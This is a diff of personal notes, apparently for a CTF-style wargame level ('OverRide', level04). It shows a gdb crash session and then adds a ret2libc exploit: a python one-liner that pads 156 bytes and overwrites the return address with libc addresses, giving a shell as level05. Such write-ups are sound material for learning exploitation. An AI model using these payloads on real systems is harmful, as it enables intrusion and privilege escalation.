@@ -186,7 +186,7 @@ Continuing.
 
 Program received signal SIGSEGV, Segmentation fault.
 0xffffd5a7 in ?? ()
-(gdb) x/32xb $eip
+(gdb) 
 0xffffd5a7:	0xf7	0x9f	0x00	0x00	0x00	0x00	0x30	0xfd
 0xffffd5af:	0xf7	0x1a	0x00	0x00	0x00	0x00	0x90	0xfd
 0xffffd5b7:	0xf7	0xa1	0x80	0xfd	0xf7	0x81	0xd6	0xff
@@ -226,3 +226,14 @@ es             0x2b	43
 fs             0x0	0
 gs             0x63	99
 (gdb) 
+
+
+--- ret2libc---
+On a determine que l'offset est 156
+En reprenant l'exo 1)
+(python -c 'print("A"*156 +"\xf7\xe6\xae\xd0"[::-1] +"\xf7\xe5\xeb\x70"[::-1] +"\xf7\xf8\x97\xec"[::-1])'; cat) | ./level04
+level04@OverRide:~$ (python -c 'print("A"*156 +"\xf7\xe6\xae\xd0"[::-1] +"\xf7\xe5\xeb\x70"[::-1] +"\xf7\xf8\x97\xec"[::-1])'; cat) | ./level04
+Give me some shellcode, k
+whoami
+level05
+
